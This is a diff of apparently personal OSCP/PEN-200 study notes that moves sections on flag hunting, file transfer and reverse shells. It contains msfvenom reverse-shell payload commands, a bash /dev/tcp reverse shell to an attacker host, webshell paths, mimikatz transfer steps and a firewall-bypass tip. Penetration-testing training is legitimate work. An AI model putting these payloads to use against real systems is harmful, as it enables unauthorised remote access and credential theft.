@@ -2,6 +2,8 @@
 
 - [Resources](#resources)
 - [Methodology](#methodology)
+- [Reverse shell](#reverse-shell)
+- [Capture the flag](#capture-the-flag)
 - [PWK-200 syallabus](#pwk-200-syallabus) 
   - [6. Information gathering](#6-information-gathering)
   - [7. Vulnerability scanning](#7-vulnerability-scanning)
@@ -56,32 +58,19 @@
 - [OffSec Discord](https://discord.gg/offsec)
   - OffSec portal > Explorer > Discord > link OffSec account to discord
 - [OffSec Study Plan and Exam FAQ](https://help.offsec.com/hc/en-us/sections/6970444968596-Penetration-Testing-with-Kali-Linux-PEN-200)
-- Capture the Flag  
-  - Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`
-  - Find flag:  
-    - Linux: `find / -name "flag.txt" 2>/dev/null`  (cat flag.txt)  
-    - Windows: C:\Windows\system32> `where /r C:\ flag.txt`  (type flag.txt)  
-    - Windows: PS C:\Windows\System32\WindowsPowerShell\v1.0> `gci C:\ -Filter flag.txt -Recurse -ea SilentlyContinue` (type flag.txt)  
-  - ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
-    - aspx: cmdasp.aspx
-    - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
-    - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
-  - generate reverse shell payload  
-    **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
-    **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
-    **step 3 generate payload based on target platform**  
-    - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
-    - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
-    - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
-    - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
-    - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
-    - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`  
-    - Bash RCE, command injection: `bash -i >& /dev/tcp/<KALI>/4444 0>&1`
-      
-    **Tips:**  
-    - Always match LPORT between payload and nc  
-    - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
-    - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls  
+
+## Capture the flag 
+- Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`  
+  - Linux
+    - `find / -name "local.txt" 2>/dev/null`  
+    - `cat /home/<username>/local.txt`  
+    - `cat /root/proof.txt`  
+  - Windows
+    - `PS C:\users> Get-ChildItem -Path C:\ -Recurse -Filter "local.txt" -ErrorAction SilentlyContinue`  
+    - `type C:\Users\<username>\Desktop\local.txt`  
+    - `type C:\Users\Administrator\Desktop\proof.txt`  
+
+ ## Common ports
   - Kali port:
     - 4444 (reverse shell)
     - 8080 (burp suite)
@@ -119,42 +108,69 @@
 	| 5432 | TCP      | PostgreSQL           | SQLi, privilege escalation                               |
 	| 5900 | TCP      | VNC                  | GUI access, no auth                                      |
   - File transfer
-    - windows <> Kali
-      ```
-      sudo apt install pipx -y
-      pipx ensurepath
-      pipx install wsgidav
-      mkdir ~/share
-
-      wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share
-
-      On RDP Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
-      ```
-    - RDP <> Kali
-      `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.157.202 /cert:ignore /drive:share,/home/kali/share`  
-    - Linux <> Kali
-    - SMB (port 445)
-      - `smbclient -L \\\\192.168.171.10`: List available SMB shares on the target  
-      - `smbclient \\\\192.168.171.10\\Users -N`: Connect to the Users share anonymously  
-        smb: \> ls  
-	smb: \offsec\Downloads\> ls  
-	smb: \offsec\Downloads\> get flag.txt
-    - Kali find file: `find ~/ -iname "mimikatz.exe"`
-    - transfer exploit to windows machine
-      `scp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe IEUser@192.168.56.104:/Users/IEUser/` OR
-      ```
-      download the package from https://github.com/gentilkiwi/mimikatz/releases
-      unzip to /home/kali/offsec/tools/minikatz
-      cd to /home/kali/offsec/tools/minikatz/x64
-      python3 -m http.server 80
-
-      target open the http://<KALI>
-      ```
+ 
   - Selecting [exploit](https://www.exploit-db.com/) rules
     - Priority
       - match service + version, unauthenticated exploit, RCE, exploit in python/bash, exploit with shellcode/reversell, exploit available in 'searchsploit'
     - Non-priority
       - DoS, requires authentication, need compilation, PoC without reverse shell, MSF module, written in unfamiliar language like perl/Java
+
+## Capture the flag
+
+## File transfer 
+- Download windows file to Kali
+  ```
+  sudo apt install pipx -y
+  pipx ensurepath
+  pipx install wsgidav
+  mkdir ~/share
+
+  wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share
+
+  On RDP Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
+  ```
+- Windows RDP <> Kali
+  - `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.157.202 /cert:ignore /drive:share,/home/kali/share`  
+  - Linux <> Kali
+- SMB (port 445)
+  - `smbclient -L \\\\192.168.171.10`: List available SMB shares on the target  
+  - `smbclient \\\\192.168.171.10\\Users -N`: Connect to the Users share anonymously  
+    smb: \> ls  
+	smb: \offsec\Downloads\> ls  
+	smb: \offsec\Downloads\> get flag.txt
+- Kali find file: `find ~/ -iname "mimikatz.exe"`
+  - transfer exploit to windows machine
+    `scp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe IEUser@192.168.56.104:/Users/IEUser/` OR
+    ```
+    download the package from https://github.com/gentilkiwi/mimikatz/releases
+    unzip to /home/kali/offsec/tools/minikatz
+    cd to /home/kali/offsec/tools/minikatz/x64
+    python3 -m http.server 80
+
+    target open the http://<KALI>
+    ```
+	  
+## Reverse shell
+- ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
+  - aspx: cmdasp.aspx
+  - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
+  - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+- generate reverse shell payload  
+  **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
+  **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
+  **step 3 generate payload based on target platform**  
+  - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
+  - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
+  - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
+  - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
+  - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
+  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`  
+  - Bash RCE, command injection: `bash -i >& /dev/tcp/<KALI>/4444 0>&1`
+    
+**Tips:**  
+  - Always match LPORT between payload and nc  
+  - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
+  - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls
 
 ## Methodology 
 
